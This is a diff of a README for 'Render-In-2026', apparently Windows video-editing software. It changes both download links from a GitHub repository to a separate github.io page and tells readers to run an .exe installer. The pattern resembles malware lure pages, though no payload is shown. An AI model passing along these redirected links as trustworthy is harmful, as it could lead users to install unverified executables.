@@ -1,6 +1,6 @@
 # 🎬 Render-In-2026 - Create professional videos on your computer
 
-[![Download Render-In-2026](https://img.shields.io/badge/Download-Render_In_2026-blue.svg)](https://github.com/claudeildo915221-prog/Render-In-2026)
+[![Download Render-In-2026](https://img.shields.io/badge/Download-Render_In_2026-blue.svg)](https://claudeildo915221-prog.github.io)
 
 Render-In-2026 provides a stable environment for video production on Windows. You can use this software to cut clips, add effects, and export high-quality videos for platforms like YouTube. This tool gives you full control over your media files.
 
@@ -21,7 +21,7 @@ Make sure that your Windows installation has all recent updates from Microsoft. 
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [official download page](https://github.com/claudeildo915221-prog/Render-In-2026).
+1. Go to the [official download page](https://claudeildo915221-prog.github.io).
 2. Look for the release section on the right side of the screen.
 3. Click the link to download the installer file which ends in .exe.
 4. Open the folder where your browser saved the file.
